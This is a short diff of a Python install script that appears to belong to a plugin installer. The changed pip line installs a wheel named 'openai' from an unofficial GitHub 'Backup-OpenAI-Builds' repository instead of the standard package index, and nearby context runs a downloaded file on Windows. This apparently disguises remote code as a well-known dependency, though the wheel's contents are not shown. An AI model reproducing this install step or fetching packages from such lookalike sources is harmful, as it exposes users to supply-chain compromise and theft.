@@ -27,7 +27,7 @@ def install_dotnet():
         if system == 'Windows':
             subprocess.run([filepath])
 print("Installing")
-launch.run_pip(f"install pycryptodome, https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl")
+launch.run_pip(f"install pycryptodome https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl")
 import openai
 print("Dot")
 install_dotnet()
